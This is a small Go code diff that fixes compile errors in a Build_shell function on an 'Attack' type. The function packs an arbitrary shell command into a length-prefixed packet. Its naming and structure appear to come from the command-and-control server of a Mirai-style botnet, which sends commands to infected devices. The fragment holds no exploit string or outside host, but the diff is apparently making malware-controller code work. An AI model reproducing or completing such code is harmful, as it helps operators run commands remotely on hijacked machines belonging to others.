@@ -339,17 +339,17 @@ func NewAttack(str string, admin int) (*Attack, error) {
     return atk, nil
 }
 
-func(this *Attack) Build_shell(string cmd) ([]byte, error) {
+func(this *Attack) Build_shell(cmd string) ([]byte, error) {
 	buf := make([]byte, 0)
 	buf = append(buf, byte('\xFE'))
 	tmp := make([]byte, len(cmd))
-	buf = append(buf, cmd)
-	tmp := make([]byte, 2)
+        tmp = []byte(cmd)
+	buf = append(buf, tmp...)
+	tmp = make([]byte, 2)
 	// Specify the total length
     if len(buf) > 4096 {
         return nil, errors.New("\033[31mMax buffer is 4096")
     }
-    tmp = make([]byte, 2)
     binary.BigEndian.PutUint16(tmp, uint16(len(buf) + 2))
     buf = append(tmp, buf...)
 	return buf, nil
